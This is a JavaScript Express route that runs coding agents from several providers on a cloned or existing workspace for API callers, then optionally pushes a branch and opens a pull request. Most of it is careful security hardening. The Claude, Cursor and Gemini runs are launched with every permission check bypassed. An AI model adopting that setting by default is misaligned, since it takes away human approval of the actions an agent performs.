// long and legitimately bursty — but bounded.
const agentLimiter = createRateLimiter({
  windowMs: 60_000,
  max: 20,
  message: 'Too many agent requests, please try again later',
});

router.post('/', agentLimiter, validateExternalApiKey, async (req, res) => {
  const { githubUrl, projectPath, message, provider = 'claude', model, effort, githubToken, branchName, sessionId } = req.body;

  // Parse stream and cleanup as booleans (handle string "true"/"false" from curl)
  const stream = req.body.stream === undefined ? true : (req.body.stream === true || req.body.stream === 'true');
  const cleanup = req.body.cleanup === undefined ? true : (req.body.cleanup === true || req.body.cleanup === 'true');

  // If branchName is provided, automatically enable createBranch
  const createBranch = branchName ? true : (req.body.createBranch === true || req.body.createBranch === 'true');
  const createPR = req.body.createPR === true || req.body.createPR === 'true';

  // Validate inputs
  if (!githubUrl && !projectPath) {
    return res.status(400).json({ error: 'Either githubUrl or projectPath is required' });
  }

  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'message is required' });
  }

  // KM-3/GL-8 (ADR-062): kimi and glm join the allowlist for the AGENT surface —
  // the /api/agent endpoint is inherently an agent run (never chat), so kimi maps
  // to the native governed launcher and glm to the OpenCode carrier (flag-gated,
  // enforced in the dispatch below). Their toolless CHAT path is unaffected.
  if (!['claude', 'cursor', 'codex', 'gemini', 'opencode', 'kimi', 'glm'].includes(provider)) {
    return res.status(400).json({ error: 'provider must be "claude", "cursor", "codex", "gemini", "opencode", "kimi", or "glm"' });
  }

  // GL-8 (ADR-062): the GLM agent surface rides ENTIRELY on the OpenCode carrier,
  // which is gated behind the NASSAJ_OPENCODE_CARRIER fleet flag (default OFF). With
  // the flag OFF there is no available agent path for glm (its toolless chat surface
  // is separate and unaffected), so refuse here — a pre-flight refusal BEFORE any
  // writer/SSE headers or project registration, mirroring the WS dispatch where a
  // flag-OFF glm agent turn is never routed to the carrier. Flag OFF ⇒ exact prior
  // behavior (glm was not an allowed agent provider at all).
  if (provider === 'glm' && !isOpenCodeCarrierEnabled()) {
    return res.status(400).json({ error: 'glm agent provider is not enabled' });
  }

  // B-36: a client-supplied projectPath (existing project or clone target) must
  // resolve (symlinks included) inside WORKSPACES_ROOT — same containment gate
  // as project creation — so an API key cannot point the agent at arbitrary
  // host directories (e.g. /etc, another user's tree).
  if (projectPath) {
    const workspaceValidation = await validateWorkspacePath(projectPath);
    if (!workspaceValidation.valid) {
      return res.status(400).json({ error: workspaceValidation.error });
    }
    if (!isProjectPathVisibleToUser(projectPath, req.user?.id ?? null)) {
      return res.status(404).json({ error: 'Project not found' });
    }
  }

  if (sessionId && !isSessionVisibleToUser(sessionId, req.user?.id ?? null)) {
    return res.status(404).json({ error: 'Session not found' });
  }

  // Validate GitHub branch/PR creation requirements
  // Allow branch/PR creation with projectPath as long as it has a GitHub remote
  if ((createBranch || createPR) && !githubUrl && !projectPath) {
    return res.status(400).json({ error: 'createBranch and createPR require either githubUrl or projectPath with a GitHub remote' });
  }

  let finalProjectPath = null;
  let writer = null;
  // SEC-SSE-ABORT state. `requestCompleted` distinguishes the normal end-of-run
  // 'close' (which Node also emits) from a PREMATURE client disconnect.
  let requestCompleted = false;
  let clientDisconnected = false;

  /**
   * Premature client disconnect handler.
   *
   * Before this, `POST /api/agent` had NO disconnect handling at all: when the
   * caller hung up mid-stream the agent run kept going — writing every chunk
   * into a dead socket, holding its entry in claude-sdk's `activeSessions`, and
   * therefore holding the deployment gate open (safe-restart counts live
   * sessions; ghost-detach is disabled and DRAIN_TIMEOUT_MS=0 in this install).
   * A handful of abandoned curl calls could pin restarts indefinitely.
   *
   * Now: writes are muted immediately and, for the claude provider, the run is
   * aborted through the EXPORTED `abortClaudeSDKSession` (claude-sdk.js is not
   * modified). Other providers own their own child-process lifetime; for them we
   * only mute the writer and log, which is still a strict improvement.
   */
  const handleClientDisconnect = () => {
    if (requestCompleted || clientDisconnected) {
      return;
    }
    clientDisconnected = true;

    if (writer && typeof writer.markClientGone === 'function') {
      writer.markClientGone();
    }

    const runSessionId = writer && typeof writer.getSessionId === 'function'
      ? writer.getSessionId()
      : null;

    if (provider !== 'claude' || !runSessionId) {
      console.warn(
        `[agent] client disconnected mid-run (provider=${provider}, `
        + `session=${runSessionId || 'none'}); output muted`
      );
      return;
    }

    if (!isClaudeSDKSessionActive(runSessionId)) {
      return;
    }

    console.warn(`[agent] client disconnected — aborting claude session ${runSessionId}`);
    Promise.resolve()
      .then(() => abortClaudeSDKSession(runSessionId))
      .catch((abortError) => {
        console.error('[agent] failed to abort session after client disconnect:', abortError?.message);
      });
  };

  req.on('close', handleClientDisconnect);
  req.on('aborted', handleClientDisconnect);

  try {
    // Determine the final project path
    if (githubUrl) {
      // Clone repository (to projectPath if provided, otherwise generate path)
      const tokenToUse = githubToken || githubTokensDb.getActiveGithubToken(req.user.id);

      let targetPath;
      if (projectPath) {
        targetPath = projectPath;
      } else {
        // Generate a unique path for cloning
        const repoHash = crypto.createHash('md5').update(githubUrl + Date.now()).digest('hex');
        targetPath = path.join(os.homedir(), '.claude', 'external-projects', repoHash);
      }

      finalProjectPath = await cloneGitHubRepo(githubUrl.trim(), tokenToUse, targetPath);

      // B-36 edge case: a githubUrl-only request generates its own clone path which
      // bypassed the validateWorkspacePath pre-flight above (only projectPath was
      // checked). Run the same containment gate on the post-clone path so the auto-
      // generated clone target also stays inside WORKSPACES_ROOT and is never a
      // system directory.
      const clonePathValidation = await validateWorkspacePath(finalProjectPath);
      if (!clonePathValidation.valid) {
        return res.status(400).json({ error: clonePathValidation.error });
      }
    } else {
      // Use existing project path
      finalProjectPath = normalizeProjectPath(path.resolve(projectPath));

      // Verify the path exists
      try {
        await fs.access(finalProjectPath);
      } catch (error) {
        throw new Error(`Project path does not exist: ${finalProjectPath}`);
      }
    }

    finalProjectPath = normalizeProjectPath(finalProjectPath);

    // Register project path in DB (or reuse existing active registration).
    // Attribute the creator so the private-project authorization layer (B-PRIV)
    // can identify the owner. Re-used active rows keep their original created_by.
    const creatorUserId = Number.isInteger(req.user?.id) ? req.user.id : null;
    const registrationResult = projectsDb.createProjectPath(finalProjectPath, null, creatorUserId);
    if (registrationResult.outcome === 'active_conflict') {
      console.log('Project registration already exists for:', finalProjectPath);
    } else {
      console.log('Project registered:', registrationResult.project);
    }

    // Set up writer based on streaming mode
    if (stream) {
      // Set up SSE headers for streaming
      res.setHeader('Content-Type', 'text/event-stream');
      res.setHeader('Cache-Control', 'no-cache');
      res.setHeader('Connection', 'keep-alive');
      res.setHeader('X-Accel-Buffering', 'no'); // Disable nginx buffering

      writer = new SSEStreamWriter(res, req.user.id);

      // Send initial status
      writer.send({
        type: 'status',
        message: githubUrl ? 'Repository cloned and session started' : 'Session started',
        projectPath: finalProjectPath
      });
    } else {
      // Non-streaming mode: collect messages
      writer = new ResponseCollector(req.user.id);

      // Collect initial status message
      writer.send({
        type: 'status',
        message: githubUrl ? 'Repository cloned and session started' : 'Session started',
        projectPath: finalProjectPath
      });
    }

    const codexModels = (await providerModelsService.getProviderModels('codex', {}, req.user?.id ?? null)).models;
    const geminiModels = (await providerModelsService.getProviderModels('gemini')).models;
    const opencodeModels = (await providerModelsService.getProviderModels('opencode')).models;

    // Start the appropriate session
    if (provider === 'claude') {
      console.log('🤖 Starting Claude SDK session');

      await queryClaudeSDK(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model,
        // Structured effort field (low|medium|high|xhigh|max|ultracode|auto).
        // Validated against the allowlist in mapCliOptionsToSDK; unknown values
        // are safely ignored there.
        effort: effort,
        permissionMode: 'bypassPermissions' // Bypass all permissions for API calls
      }, writer);

    } else if (provider === 'cursor') {
      console.log('🖱️ Starting Cursor CLI session');

      await spawnCursor(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || undefined,
        skipPermissions: true // Bypass permissions for Cursor
      }, writer);
    } else if (provider === 'codex') {
      console.log('🤖 Starting Codex SDK session');

      await queryCodex(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || codexModels.DEFAULT,
        // T-884: run autonomously (no approval prompts) but capped to the
        // workspace-write ceiling. Pinning 'acceptEdits' — NOT 'bypassPermissions' —
        // keeps this headless path at workspace-write even if the
        // CODEX_ALLOW_FULL_ACCESS escape hatch is ever enabled for another path.
        permissionMode: 'acceptEdits'
      }, writer);
    } else if (provider === 'gemini') {
      console.log('✨ Starting Gemini CLI session');

      await spawnGemini(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || geminiModels.DEFAULT,
        skipPermissions: true // CLI mode bypasses permissions
      }, writer);
    } else if (provider === 'opencode') {
      console.log('Starting OpenCode CLI session');

      await spawnOpenCode(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || opencodeModels.DEFAULT
      }, writer);
    } else if (provider === 'kimi') {
      // KM-3 (ADR-062): native governed Kimi agent launcher. permissionMode is
      // pinned to 'acceptEdits' — the SAFE autonomous ceiling (workspace-write via
      // Kimi `--auto`), mirroring the Codex T-884 headless mapping. The SL-4
      // ceiling caps this even if KIMI_ALLOW_FULL_ACCESS is ever set, and network
      // stays OFF; a client value never widens it. Governance/digest/env-sanitize
      // are enforced fail-closed inside prepareKimiAgentLaunch.
      console.log('🌙 Starting Kimi native agent session');

      await spawnKimiAgent(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || undefined,
        permissionMode: 'acceptEdits'
      }, writer);
    } else if (provider === 'glm') {
      // GL-8 (ADR-062): GLM runs through the OpenCode CARRIER (provider-prefixed
      // `glm/<model>`, carrier=true so opencode-cli.js takes its governed carrier
      // path: GL-5 governance gate + GL-3 baseURL allowlist + GL-6 digest pin +
      // env sanitize). The carrier flag is already asserted ON by the pre-flight
      // guard above, so reaching here means the surface is enabled.
      console.log('🧩 Starting GLM session via OpenCode carrier');

      const rawGlmModel = typeof model === 'string' ? model.trim() : '';
      const carrierModel = rawGlmModel
        ? (rawGlmModel.startsWith('glm/') ? rawGlmModel : `glm/${rawGlmModel}`)
        : undefined;

      await spawnOpenCode(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        carrier: true,
        ...(carrierModel ? { model: carrierModel } : {})
      }, writer);
    }

    // Handle GitHub branch and PR creation after successful agent completion
    let branchInfo = null;
    let prInfo = null;

    if (createBranch || createPR) {
      try {
        console.log('🔄 Starting GitHub branch/PR creation workflow...');

        // Get GitHub token
        const tokenToUse = githubToken || githubTokensDb.getActiveGithubToken(req.user.id);

        if (!tokenToUse) {
          throw new Error('GitHub token required for branch/PR creation. Please configure a GitHub token in settings.');
        }

        // Initialize Octokit
        const octokit = new Octokit({ auth: tokenToUse });

        // Get GitHub URL - either from parameter or from git remote.
        // SEC-GIT-URL: both sources go through the SAME strict validator; the
        // old `.includes('github.com')` here had the identical bypass as the
        // clone gate. `repoUrl` is then replaced by the CANONICAL rebuilt URL,
        // so everything downstream (buildTokenPushUrl → `git push <url>`) only
        // ever sees https://github.com/<owner>/<repo>.git.
        let repoUrl;
        let owner;
        let repo;
        if (githubUrl) {
          ({ owner, repo, cloneUrl: repoUrl } = parseSafeGitHubUrl(githubUrl));
        } else {
          console.log('🔍 Getting GitHub URL from git remote...');
          let remoteUrl;
          try {
            remoteUrl = await getGitRemoteUrl(finalProjectPath);
          } catch (error) {
            throw new Error(`Failed to get GitHub remote URL: ${error.message}`);
          }
          try {
            ({ owner, repo, cloneUrl: repoUrl } = parseSafeGitHubRemote(remoteUrl));
          } catch {
            throw new Error('Project does not have a GitHub remote configured');
          }
          console.log(`✅ Found GitHub remote: ${repoUrl}`);
        }
        console.log(`📦 Repository: ${owner}/${repo}`);

        // Use provided branch name or auto-generate from message
        const finalBranchName = branchName || autogenerateBranchName(message);
        if (branchName) {
          console.log(`🌿 Using provided branch name: ${finalBranchName}`);

          // Validate custom branch name
          const validation = validateBranchName(finalBranchName);
          if (!validation.valid) {
            throw new Error(`Invalid branch name: ${validation.error}`);
          }
        } else {
          console.log(`🌿 Auto-generated branch name: ${finalBranchName}`);
        }

        if (createBranch) {
          // Create and checkout the new branch locally
          console.log('🔄 Creating local branch...');
          const checkoutProcess = spawn('git', ['checkout', '-b', finalBranchName], {
            cwd: finalProjectPath,
            stdio: 'pipe'
          });

          await new Promise((resolve, reject) => {
            let stderr = '';
            checkoutProcess.stderr.on('data', (data) => { stderr += data.toString(); });
            checkoutProcess.on('close', (code) => {
              if (code === 0) {
                console.log(`✅ Created and checked out local branch '${finalBranchName}'`);
                resolve();
              } else {
                // Branch might already exist locally, try to checkout
                if (stderr.includes('already exists')) {
                  console.log(`ℹ️ Branch '${finalBranchName}' already exists locally, checking out...`);
                  const checkoutExisting = spawn('git', ['checkout', finalBranchName], {
                    cwd: finalProjectPath,
                    stdio: 'pipe'
                  });
                  checkoutExisting.on('close', (checkoutCode) => {
                    if (checkoutCode === 0) {
                      console.log(`✅ Checked out existing branch '${finalBranchName}'`);
                      resolve();
                    } else {
                      reject(new Error(`Failed to checkout existing branch: ${stderr}`));
                    }
                  });
                } else {
                  reject(new Error(`Failed to create branch: ${stderr}`));
                }
              }
            });
          });

          // Push the branch to remote.
          // Per-user push credentials (B-MU-UX-GIT-ID): reuse the already
          // resolved per-user token (tokenToUse = githubToken || the requesting
          // user's active token). When the origin is an https github URL, push
          // to a transient token-embedded URL so the push is attributed to the
          // user; the token is NEVER persisted to .git/config and NEVER logged.
          // Falls back to `origin` (shared) for non-https-github remotes.
          console.log('🔄 Pushing branch to remote...');
          const tokenPushUrl = buildTokenPushUrl(repoUrl, tokenToUse);
          const pushArgs = tokenPushUrl
            ? ['push', tokenPushUrl, `${finalBranchName}:${finalBranchName}`]
            : ['push', '-u', 'origin', finalBranchName];
          const pushProcess = spawn('git', pushArgs, {
            cwd: finalProjectPath,
            stdio: 'pipe'
          });

          await new Promise((resolve, reject) => {
            let stderr = '';
            let stdout = '';
            pushProcess.stdout.on('data', (data) => { stdout += data.toString(); });
            pushProcess.stderr.on('data', (data) => { stderr += data.toString(); });
            pushProcess.on('close', (code) => {
              if (code === 0) {
                console.log(`✅ Pushed branch '${finalBranchName}' to remote`);
                resolve();
              } else {
                // Check if branch exists on remote but has different commits
                if (stderr.includes('already exists') || stderr.includes('up-to-date')) {
                  console.log(`ℹ️ Branch '${finalBranchName}' already exists on remote, using existing branch`);
                  resolve();
                } else {
                  reject(new Error(`Failed to push branch: ${stderr}`));
                }
              }
            });
          });

          // When we pushed via a token URL (no -u possible against a raw URL),
          // record the upstream against the clean `origin` remote so .git/config
          // tracks origin — never the token-embedded URL.
          if (tokenPushUrl) {
            try {
              await new Promise((resolve) => {
                const cfg = spawn('git', ['config', `branch.${finalBranchName}.remote`, 'origin'], { cwd: finalProjectPath, stdio: 'pipe' });
                cfg.on('close', () => resolve());
                cfg.on('error', () => resolve());
              });
              await new Promise((resolve) => {
                const cfg = spawn('git', ['config', `branch.${finalBranchName}.merge`, `refs/heads/${finalBranchName}`], { cwd: finalProjectPath, stdio: 'pipe' });
                cfg.on('close', () => resolve());
                cfg.on('error', () => resolve());
              });
            } catch {
              // Upstream tracking is best-effort; the push already succeeded.
            }
          }

          branchInfo = {
            name: finalBranchName,
            url: `https://github.com/${owner}/${repo}/tree/${finalBranchName}`
          };
        }

        if (createPR) {
          // Get commit messages to generate PR description
          console.log('🔄 Generating PR title and description...');
          const commitMessages = await getCommitMessages(finalProjectPath, 5);

          // Use the first commit message as the PR title, or fallback to the agent message
          const prTitle = commitMessages.length > 0 ? commitMessages[0] : message;

          // Generate PR body from commit messages
          let prBody = '## Changes\n\n';
          if (commitMessages.length > 0) {
            prBody += commitMessages.map(msg => `- ${msg}`).join('\n');
          } else {
            prBody += `Agent task: ${message}`;
          }
          prBody += '\n\n---\n*This pull request was automatically created by CloudCLI.ai Agent.*';

          console.log(`📝 PR Title: ${prTitle}`);

          // Create the pull request
          console.log('🔄 Creating pull request...');
          prInfo = await createGitHubPR(octokit, owner, repo, finalBranchName, prTitle, prBody, 'main');
        }

        // Send branch/PR info in response
        if (stream) {
          if (branchInfo) {
            writer.send({
              type: 'github-branch',
              branch: branchInfo
            });
          }
          if (prInfo) {
            writer.send({
              type: 'github-pr',
              pullRequest: prInfo
            });
          }
        }

      } catch (error) {
        console.error('❌ GitHub branch/PR creation error:', error);

        // Send error but don't fail the entire request
        if (stream) {
          writer.send({
            type: 'github-error',
            error: error.message
          });
        }
        // Store error info for non-streaming response
        if (!stream) {
          branchInfo = { error: error.message };
          prInfo = { error: error.message };
        }
      }
    }

    // Handle response based on streaming mode. Mark completion FIRST so the
    // 'close' Node emits after res.end() is not mistaken for a disconnect.
    requestCompleted = true;
    if (stream) {
      // Streaming mode: end the SSE stream
      writer.end();
    } else {
      // Non-streaming mode: send filtered messages and token summary as JSON
      const assistantMessages = writer.getAssistantMessages();
      const tokenSummary = writer.getTotalTokens();

      const response = {
        success: true,
        sessionId: writer.getSessionId(),
        messages: assistantMessages,
        tokens: tokenSummary,
        projectPath: finalProjectPath
      };

      // Add branch/PR info if created
      if (branchInfo) {
        response.branch = branchInfo;
      }
      if (prInfo) {
        response.pullRequest = prInfo;
      }

      res.json(response);
    }

    // Clean up if requested
    if (cleanup && githubUrl) {
      // Only cleanup if we cloned a repo (not for existing project paths)
      const sessionIdForCleanup = writer.getSessionId();
      setTimeout(() => {
        cleanupProject(finalProjectPath, sessionIdForCleanup);
      }, 5000);
    }

  } catch (error) {
    console.error('❌ External session error:', error);
    // The request is terminating here; suppress the disconnect path.
    requestCompleted = true;

    // Clean up on error
    if (finalProjectPath && cleanup && githubUrl) {
      const sessionIdForCleanup = writer ? writer.getSessionId() : null;
      cleanupProject(finalProjectPath, sessionIdForCleanup);
    }

    if (stream) {
      // For streaming, send error event and stop
      if (!writer) {
        // Set up SSE headers if not already done
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        res.setHeader('X-Accel-Buffering', 'no');
        writer = new SSEStreamWriter(res, req.user.id);
      }

      if (!res.writableEnded) {
        writer.send({
          type: 'error',
          error: error.message,
          message: `Failed: ${error.message}`
        });
        writer.end();
      }
    } else if (!res.headersSent) {
      res.status(500).json({
        success: false,
        error: error.message
      });
    }
  }
});

export default router;
